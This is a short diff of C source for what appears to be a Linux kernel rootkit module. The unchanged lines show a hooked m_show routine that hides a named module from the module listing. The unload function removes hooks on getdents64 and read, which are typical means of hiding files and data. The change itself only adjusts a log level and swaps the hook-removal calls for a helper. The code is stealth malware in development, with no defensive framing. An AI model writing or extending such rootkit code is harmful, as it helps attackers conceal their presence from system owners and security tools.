@@ -158,7 +158,7 @@ int new_m_show(struct seq_file *m, void *p) {
 
     struct module *mod = list_entry(p, struct module, list);
     if (!strcmp(mod->name, mod_name_to_hide)) {
-        pr_warn("Hiding %s from m_show", mod->name);
+        pr_info("Hiding %s from m_show", mod->name);
         return 0;
     }
 
@@ -196,9 +196,9 @@ int load(void) {
 void unload(void) {
     pr_info("Shutting down.");
 
-    unregister_ftrace_function(&m_show_hook.ops);
-    unregister_ftrace_function(&getdents64_hook.ops);
-    unregister_ftrace_function(&read_hook.ops);
+    remove_hook(&m_show_hook);
+    remove_hook(&getdents64_hook);
+    remove_hook(&read_hook);
 
     pr_info("Goodbye world...");
 }
